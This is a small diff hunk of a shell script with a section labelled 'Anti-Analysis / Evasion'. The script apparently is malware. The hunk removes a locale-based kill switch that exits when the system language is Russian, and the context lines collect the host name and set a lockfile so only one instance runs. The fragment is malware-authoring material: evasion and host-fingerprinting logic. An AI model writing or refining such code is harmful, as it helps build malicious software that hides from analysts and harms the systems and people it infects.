@@ -12,11 +12,6 @@ HOSTNAME_VAL="$(hostname 2>/dev/null || cat /etc/hostname 2>/dev/null || echo "u
 
 # ── Anti-Analysis / Evasion ──────────────────────────────────────────────────
 
-_lang="${LANG:-en_US}"
-if [[ "$_lang" == ru_* ]]; then
-    exit 0 2>/dev/null
-fi
-
 LOCKFILE="/tmp/${LOCK_NAME}"
 if [ -f "$LOCKFILE" ]; then
     _pid=$(cat "$LOCKFILE" 2>/dev/null)
